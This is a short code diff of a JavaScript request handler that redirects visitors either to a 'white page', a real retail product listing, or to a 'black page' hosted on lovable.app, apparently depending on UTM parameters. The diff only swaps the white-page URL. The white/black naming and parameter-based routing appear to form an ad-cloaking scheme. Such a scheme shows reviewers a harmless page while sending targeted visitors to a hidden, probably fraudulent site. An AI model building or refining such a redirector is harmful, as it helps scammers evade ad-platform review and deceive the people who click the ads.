@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://gearwrenchshop.com/products/gearwrench-81298t-3-pc-1-4-3-8-1-2-drive-90-tooth-dual-material-locking-flex-head-ratchet-set";
+    const whitePageURL = "https://www.bambystore.it/en/product/inglesina-quid-3-stroller/";
     const blackPageURL = "https://dashexpressre.lovable.app";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
